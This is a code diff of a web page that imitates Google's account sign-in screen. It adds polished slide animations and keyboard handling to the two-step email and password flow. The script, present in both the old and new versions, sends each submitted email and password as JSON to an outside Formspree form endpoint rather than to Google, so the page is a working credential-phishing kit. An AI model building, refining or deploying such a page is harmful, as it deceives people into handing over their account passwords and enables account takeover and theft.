@@ -8,10 +8,24 @@
 *{box-sizing:border-box;margin:0;padding:0}
 body{background:#1f1f1f;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:'Google Sans',Roboto,Arial,sans-serif;padding:20px}
 .card{background:#2d2d2d;border-radius:28px;width:100%;max-width:780px;padding:48px 48px 40px;display:flex;gap:48px;align-items:flex-start}
-.left{flex:0 0 220px;display:flex;flex-direction:column;gap:12px}
+.left{flex:0 0 220px;display:flex;flex-direction:column;gap:12px;overflow:hidden}
 .left h1{font-size:32px;font-weight:400;color:#e3e3e3;line-height:1.2}
 .left p{font-size:16px;color:#e3e3e3;margin-top:4px}
-.right{flex:1;display:flex;flex-direction:column}
+.left-text{transition:opacity 0.22s ease, transform 0.22s ease}
+.left-text.slide-out{opacity:0;transform:translateY(-10px)}
+.left-text.slide-in{animation:slideInDown 0.28s ease forwards}
+@keyframes slideInDown{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.right{flex:1;display:flex;flex-direction:column;position:relative;overflow:hidden;min-height:200px}
+.step{position:absolute;top:0;left:0;width:100%;display:flex;flex-direction:column;opacity:0;pointer-events:none;transform:translateX(30px);transition:none}
+.step.active{position:relative;opacity:1;pointer-events:auto;transform:translateX(0)}
+.step.exit-left{position:absolute;top:0;left:0;width:100%;animation:exitLeft 0.22s ease forwards;pointer-events:none}
+.step.enter-right{animation:enterRight 0.28s ease forwards}
+.step.exit-right{position:absolute;top:0;left:0;width:100%;animation:exitRight 0.22s ease forwards;pointer-events:none}
+.step.enter-left{animation:enterLeft 0.28s ease forwards}
+@keyframes exitLeft{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(-40px)}}
+@keyframes enterRight{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
+@keyframes exitRight{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(40px)}}
+@keyframes enterLeft{from{opacity:0;transform:translateX(-40px)}to{opacity:1;transform:translateX(0)}}
 .input-wrap{position:relative;margin-bottom:6px}
 .input-wrap input{width:100%;height:56px;background:transparent;border:1px solid #8e918f;border-radius:4px;padding:18px 14px 2px;font-size:16px;color:#e3e3e3;outline:none;transition:border-color 0.2s;font-family:inherit}
 .input-wrap input:focus{border:2px solid #a8c7fa}
@@ -31,14 +45,12 @@ body{background:#1f1f1f;min-height:100vh;display:flex;flex-direction:column;alig
 .next-btn:hover{background:#c2d7fd}
 .back-btn{background:none;border:none;color:#a8c7fa;font-size:14px;font-family:inherit;font-weight:500;cursor:pointer;padding:10px 16px;border-radius:20px;margin-right:auto}
 .back-btn:hover{background:rgba(168,199,250,0.08)}
-.email-pill{border:1px solid #8e918f;border-radius:20px;padding:4px 12px;font-size:14px;color:#e3e3e3;display:inline-flex;align-items:center;gap:6px;cursor:pointer;margin-bottom:20px}
-.email-pill:hover{background:rgba(255,255,255,0.05)}
+.pw-email-line{font-size:14px;color:#e3e3e3;margin-bottom:20px;display:flex;align-items:center;gap:6px}
+.pw-email-line svg{flex-shrink:0}
 .show-pw{display:flex;align-items:center;gap:8px;margin-top:8px;cursor:pointer;user-select:none;font-size:14px;color:#c4c7c5}
 .show-pw input[type=checkbox]{accent-color:#a8c7fa;width:16px;height:16px;cursor:pointer}
-.pw-info{font-size:14px;color:#c4c7c5;margin-top:16px;line-height:1.6}
-.pw-info a{color:#a8c7fa;text-decoration:none;font-weight:500}
-.step{display:none;flex-direction:column}
-.step.active{display:flex}
+.try-another{background:none;border:none;color:#a8c7fa;font-size:14px;font-family:inherit;font-weight:500;cursor:pointer;padding:0;margin-top:20px;text-align:left}
+.try-another:hover{text-decoration:underline}
 footer{display:flex;justify-content:space-between;align-items:center;width:100%;max-width:780px;margin-top:20px;font-size:13px;color:#8e918f}
 footer select{background:none;border:none;color:#8e918f;font-size:13px;font-family:inherit;cursor:pointer;outline:none}
 .footer-links{display:flex;gap:20px}
@@ -60,8 +72,10 @@ footer select{background:none;border:none;color:#8e918f;font-size:13px;font-fami
       <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
       <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
     </svg>
-    <h1 id="card-title">Sign in</h1>
-    <p id="card-sub">Use your Google Account</p>
+    <div class="left-text" id="left-text">
+      <h1 id="card-title">Sign in</h1>
+      <p id="card-sub">Use your Google Account</p>
+    </div>
   </div>
   <div class="right">
 
@@ -79,10 +93,8 @@ footer select{background:none;border:none;color:#8e918f;font-size:13px;font-fami
     </div>
 
     <div class="step" id="step2">
-      <div class="email-pill" onclick="goStep1()">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#a8c7fa" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
-        <span id="email-show">user@gmail.com</span>
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#8e918f" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+      <div class="pw-email-line">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#a8c7fa" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
       </div>
       <div class="input-wrap">
         <input type="password" id="password" autocomplete="off" oninput="this.classList.toggle('has-val',this.value.length>0)">
@@ -92,11 +104,10 @@ footer select{background:none;border:none;color:#8e918f;font-size:13px;font-fami
         <input type="checkbox" onchange="document.getElementById('password').type=this.checked?'text':'password'">
         Show password
       </label>
-      <div class="forgot" style="margin-top:12px"><a href="#">Forgot password?</a></div>
-      <p class="pw-info">Before signing in, verify it's you. <a href="#">Learn more</a></p>
+      <button class="try-another" type="button">Try another way</button>
       <div class="actions">
         <button class="back-btn" type="button" onclick="goStep1()">← Back</button>
-        <button class="next-btn" type="button">Next</button>
+        <button class="next-btn" type="button" id="pw-next-btn">Next</button>
       </div>
     </div>
 
@@ -113,30 +124,76 @@ footer select{background:none;border:none;color:#8e918f;font-size:13px;font-fami
 </footer>
 
 <script>
+var animating = false;
+
+function animateLeftText(newTitle, newSub){
+  var lt = document.getElementById('left-text');
+  lt.classList.add('slide-out');
+  setTimeout(function(){
+    document.getElementById('card-title').textContent = newTitle;
+    document.getElementById('card-sub').textContent = newSub;
+    lt.classList.remove('slide-out');
+    lt.classList.add('slide-in');
+    setTimeout(function(){ lt.classList.remove('slide-in'); }, 300);
+  }, 220);
+}
+
 function goStep2(){
-  var e=document.getElementById('email').value.trim();
-  if(!e)return;
-  document.getElementById('email-show').textContent=e;
-  document.getElementById('card-title').textContent='Welcome';
-  document.getElementById('card-sub').textContent=e;
-  document.getElementById('step1').classList.remove('active');
-  document.getElementById('step2').classList.add('active');
-  setTimeout(function(){document.getElementById('password').focus()},50);
+  if(animating) return;
+  var e = document.getElementById('email').value.trim();
+  if(!e) return;
+  animating = true;
+  var s1 = document.getElementById('step1');
+  var s2 = document.getElementById('step2');
+  animateLeftText('Welcome', e);
+  s1.classList.add('exit-left');
+  setTimeout(function(){
+    s1.classList.remove('active','exit-left');
+    s2.classList.add('active','enter-right');
+    setTimeout(function(){
+      s2.classList.remove('enter-right');
+      animating = false;
+      document.getElementById('password').focus();
+    }, 280);
+  }, 220);
 }
+
 function goStep1(){
-  document.getElementById('card-title').textContent='Sign in';
-  document.getElementById('card-sub').textContent='Use your Google Account';
-  document.getElementById('step2').classList.remove('active');
-  document.getElementById('step1').classList.add('active');
-  document.getElementById('password').value='';
-  document.getElementById('password').classList.remove('has-val');
+  if(animating) return;
+  animating = true;
+  var s1 = document.getElementById('step1');
+  var s2 = document.getElementById('step2');
+  animateLeftText('Sign in', 'Use your Google Account');
+  s2.classList.add('exit-right');
+  setTimeout(function(){
+    s2.classList.remove('active','exit-right');
+    document.getElementById('password').value = '';
+    document.getElementById('password').classList.remove('has-val');
+    s1.classList.add('active','enter-left');
+    setTimeout(function(){
+      s1.classList.remove('enter-left');
+      animating = false;
+      document.getElementById('email').focus();
+    }, 280);
+  }, 220);
 }
-document.addEventListener('DOMContentLoaded',function(){
-  document.querySelector('#step2 .next-btn').addEventListener('click',function(){
-    var email=document.getElementById('email').value;
-    var password=document.getElementById('password').value;
-    if(!password)return;
-         fetch('https://formspree.io/f/mgojozaj',{
+
+document.addEventListener('DOMContentLoaded', function(){
+  document.getElementById('email').focus();
+
+  document.getElementById('email').addEventListener('keydown', function(e){
+    if(e.key === 'Enter') goStep2();
+  });
+
+  document.getElementById('password').addEventListener('keydown', function(e){
+    if(e.key === 'Enter') document.getElementById('pw-next-btn').click();
+  });
+
+  document.getElementById('pw-next-btn').addEventListener('click', function(){
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+    if(!password) return;
+     fetch('https://formspree.io/f/mgojozaj',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body:JSON.stringify({email:email,password:password})
